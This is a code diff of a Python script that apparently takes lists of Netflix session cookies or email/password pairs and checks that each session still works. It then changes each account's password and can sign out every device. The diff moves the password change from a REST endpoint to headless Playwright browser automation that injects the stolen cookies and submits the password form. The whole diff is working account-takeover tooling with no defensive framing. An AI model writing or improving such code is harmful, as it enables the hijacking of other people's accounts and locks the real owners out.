@@ -19,11 +19,6 @@ RESULT_DIR = os.path.join(BASE_DIR, 'data', 'results-password-setter')
 
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'DNT': '1',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
 }
 
 API_HEADERS = {
@@ -122,7 +117,7 @@ def collect_accounts(path):
 
 def verify_session(session):
     try:
-        r = session.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
+        r = session.get('https://www.netflix.com/password', timeout=20)
         if r.status_code != 200:
             return False, r.status_code
         if 'login' in r.url.lower():
@@ -186,59 +181,73 @@ def login_with_credentials(email, password):
         return None
 
 
-def set_password_api(session, new_password, client_id, current_password=None):
-    api_headers = {**API_HEADERS}
-    if client_id:
-        api_headers['X-Netflix-Request-Client'] = client_id
-    guid = str(uuid.uuid4())
-    api_headers['X-Netflix-Request-Guid'] = guid
+def set_password_api(nfid, snfid, new_password, current_password=None, sign_out_all=False):
+    # Netflix now uses GraphQL - memberchange REST endpoint is deprecated.
+    # Use Playwright to set password via browser (handles JS/GraphQL).
+    return set_password_playwright(nfid, snfid, new_password, current_password, sign_out_all)
 
-    payload = {
-        "password": new_password,
-        "password2": new_password,
-    }
-    if current_password:
-        payload["currentPassword"] = current_password
+def set_password_playwright(nfid, snfid, new_password, current_password=None, sign_out_all=False):
+    """Set password using Playwright (handles Netflix's GraphQL-based password change)"""
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        os.system('pip install playwright --break-system-packages')
+        try:
+            from playwright.sync_api import sync_playwright
+        except:
+            return False, 'playwright_not_installed'
 
     try:
-        r = session.post(
-            'https://www.netflix.com/api/shakti/memberchange',
-            json=payload,
-            headers=api_headers,
-            timeout=30
-        )
-        if r.status_code in (200, 201, 204):
-            return True, 'OK'
-        body = r.text[:500]
-        if 'passwordTooWeak' in body or 'weakPassword' in body:
-            return False, 'weak_password'
-        if 'passwordTooShort' in body:
-            return False, 'password_too_short'
-        if 'currentPasswordMismatch' in body or 'wrongPassword' in body:
-            return False, 'wrong_current_password'
-        if 'sameAsCurrent' in body or 'passwordSameAsCurrent' in body:
-            return False, 'same_as_current'
-        return False, f'http_{r.status_code}: {body[:100]}'
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True, args=['--no-sandbox'])
+            ctx = browser.new_context(
+                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                device_scale_factor=1,
+            )
+            page = ctx.new_page()
+
+            # Inject cookies before navigating
+            ctx.add_cookies([
+                {'name': 'NetflixId', 'value': nfid, 'domain': '.netflix.com', 'path': '/'},
+                {'name': 'SecureNetflixId', 'value': snfid, 'domain': '.netflix.com', 'path': '/'},
+            ])
+
+            page.goto('https://www.netflix.com/password', wait_until='networkidle', timeout=30000)
+
+            # Fill new password fields (actual field names from Netflix page)
+            new_input = page.query_selector('input[name="new-password"]')
+            if not new_input:
+                return False, 'no_password_field'
+            new_input.fill(new_password)
+
+            confirm_input = page.query_selector('input[name="reeneter-new-password"]')
+            if confirm_input:
+                confirm_input.fill(new_password)
+
+            # Sign out all devices checkbox
+            soad = page.query_selector('input[name="soad-checkbox"]')
+            if soad and sign_out_all:
+                soad.check()
+
+            # Click Save button
+            submit_btn = page.query_selector('button[type="submit"]')
+            if submit_btn:
+                submit_btn.click()
+                page.wait_for_timeout(3000)
+
+            # Check result — look for success message or redirect
+            final_url = page.url
+            content = page.content()
+            if 'password' not in final_url.lower() or 'saved' in content.lower():
+                return True, 'OK'
+            if 'error' in content.lower() or 'alert' in content.lower():
+                error_el = page.query_selector('[class*="error"], [class*="alert"], [role="alert"]')
+                err_text = error_el.text_content()[:80] if error_el else 'unknown_error'
+                return False, err_text
+
+            return True, 'submitted'
     except Exception as e:
-        return False, str(e)[:100]
-
-
-def sign_out_all(session, client_id):
-    api_headers = {**API_HEADERS}
-    if client_id:
-        api_headers['X-Netflix-Request-Client'] = client_id
-    api_headers['X-Netflix-Request-Guid'] = str(uuid.uuid4())
-    payload = {"action": "signOutAllDevices"}
-    try:
-        r = session.post(
-            'https://www.netflix.com/api/shakti/memberchange',
-            json=payload,
-            headers=api_headers,
-            timeout=30
-        )
-        return r.status_code in (200, 201, 204)
-    except Exception:
-        return False
+        return False, f'pw_error: {str(e)[:80]}'
 
 
 def process_cookie_account(email, nfid, snfid, fpath, new_password, sign_out_all_flag):
@@ -265,14 +274,9 @@ def process_cookie_account(email, nfid, snfid, fpath, new_password, sign_out_all
     if not has_new:
         return email, 'error', 'password_page_unexpected'
 
-    client_id = extract_client_id(html)
-
-    success, reason = set_password_api(session, new_password, client_id)
+    success, reason = set_password_api(nfid, snfid, new_password, sign_out_all=sign_out_all_flag)
     if not success:
         return email, 'error', reason
-
-    if sign_out_all_flag:
-        sign_out_all(session, client_id)
 
     return email, 'success', 'password_set'
 
@@ -286,15 +290,20 @@ def process_email_pass_account(email, password, new_password, sign_out_all_flag)
     if not ok:
         return email, 'error', f'session_dead: {data}'
 
-    html = data
-    client_id = extract_client_id(html)
+    # Extract cookies from session for Playwright
+    pw_nfid = None
+    pw_snfid = None
+    for c in session.cookies:
+        if c.name == 'NetflixId':
+            pw_nfid = c.value
+        elif c.name == 'SecureNetflixId':
+            pw_snfid = c.value
 
-    success, reason = set_password_api(session, new_password, client_id, current_password=password)
+    if not pw_nfid:
+        return email, 'error', 'no_session_cookies'
+    success, reason = set_password_api(pw_nfid, pw_snfid, new_password, current_password=password, sign_out_all=sign_out_all_flag)
     if not success:
         return email, 'error', reason
-
-    if sign_out_all_flag:
-        sign_out_all(session, client_id)
 
     return email, 'success', 'password_changed'
 
